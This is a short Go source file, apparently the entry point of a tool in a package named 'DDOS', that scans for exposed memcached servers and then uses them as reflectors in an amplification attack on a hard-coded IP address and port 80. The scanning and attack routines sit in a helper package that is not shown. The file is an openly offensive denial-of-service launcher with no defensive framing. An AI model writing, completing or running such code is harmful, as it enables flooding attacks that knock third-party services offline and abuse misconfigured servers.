package main

import "DDOS/util"

func main() {
	scan()
	attack("52.196.222.137", 80)
}

func scan() {
	util.ScanMemcacheServer()
}

func attack(targetIP string, targetPort int) {
	resultArr := util.ReadServer()
	for _, item := range resultArr {
		util.Attack(targetIP, targetPort, item)
	}
}
